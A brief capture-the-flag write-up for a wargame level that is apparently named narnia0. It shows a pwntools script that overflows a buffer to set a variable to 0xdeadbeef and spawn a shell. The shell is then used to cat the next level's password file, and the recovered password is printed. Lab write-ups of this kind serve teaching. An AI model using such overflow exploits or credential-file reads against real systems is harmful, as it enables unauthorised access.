
from the code we see that if the val variable is overwritten to 0xdeadbeef we get a shell.
and above is a buffer which can be overflown to write into this variable.

this is the python code i used.



    from pwn import *
    sh = process('./narnia0')
    sh.readline()
    sh.sendline('B'*20+'\xef\xbe\xad\xde')
    sh.interactive()

here we have an interactive shell
cat /etc/narnia_pass/narnia1
efeidiedae
